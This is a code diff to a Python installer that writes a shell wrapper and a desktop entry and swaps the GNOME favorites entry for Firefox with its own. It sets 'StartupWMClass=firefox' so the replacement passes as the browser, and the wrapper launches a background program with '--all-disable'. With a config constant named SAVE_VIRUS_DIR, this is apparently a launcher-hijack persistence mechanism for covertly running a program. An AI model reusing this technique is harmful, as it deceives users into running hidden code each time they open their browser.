@@ -1,5 +1,5 @@
 import os
-import subprocess
+import subprocess, ast
 from pathlib import Path
 from typing import Optional
 from config import (SAVE_VIRUS_DIR, BACKUP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME,
@@ -23,7 +23,7 @@ def create_wrapper_script_content(progFileName: str, progFileBackup: str) -> Opt
     fi
 
     if [ -x "$PROG" ]; then
-        "$PROG" &
+        "$PROG" --all-disable &
         PROG_PID=$!
         echo "✅ PROG started with PID: $PROG_PID"
     fi
@@ -42,8 +42,7 @@ def install_desktop_entry(wrapper_script_content: str) -> bool:
         existing_wrapper_content = wrapper_path.read_text()
         if check_sum_content(existing_wrapper_content) == check_sum_content(wrapper_script_content):
             print("Wrapper script already exists and is up to date.")
-            return True
-
+    
     try:
         wrapper_path.write_text(wrapper_script_content)
         wrapper_path.chmod(0o755)
@@ -66,6 +65,7 @@ def install_desktop_entry(wrapper_script_content: str) -> bool:
     Categories=Network;WebBrowser;
     MimeType=text/html;text/xml;application/xhtml+xml;application/xml;application/rss+xml;
     StartupNotify=true
+    StartupWMClass=firefox
     """
 
     try:
@@ -74,16 +74,22 @@ def install_desktop_entry(wrapper_script_content: str) -> bool:
             existing_content = desktop_entry_path.read_text()
             if existing_content == desktop_entry_content:
                 print("Desktop entry already exists and is up to date.")
-                return True
-
-        # Write desktop entry file
-        print(f"Creating desktop entry: {desktop_entry_path}")
-        desktop_entry_path.write_text(desktop_entry_content)
+        else:
+            # Write desktop entry file
+            print(f"Creating desktop entry: {desktop_entry_path}")
+            desktop_entry_path.write_text(desktop_entry_content)
 
         # Add to favorites (GNOME-specific) thay firebox cũ bằng cái mới
-        subprocess.run(["gsettings", "set", "org.gnome.shell", "favorite-apps",
-                        f"$(gsettings get org.gnome.shell favorite-apps | sed 's/firefox.desktop/{DESKTOP_ENTRY_NAME}/')"],
-                    shell=True, check=True)
+        out = subprocess.check_output(["gsettings", "get", "org.gnome.shell", "favorite-apps"]).decode("utf-8").strip()
+
+        favorites = ast.literal_eval(out)
+
+        favorites = [DESKTOP_ENTRY_NAME if x == "firefox.desktop" else x for x in favorites]
+        
+        if DESKTOP_ENTRY_NAME not in favorites:
+            favorites.append(DESKTOP_ENTRY_NAME)
+
+        subprocess.run(["gsettings", "set", "org.gnome.shell", "favorite-apps", str(favorites)], check=True)
 
         return True
     except Exception as e:
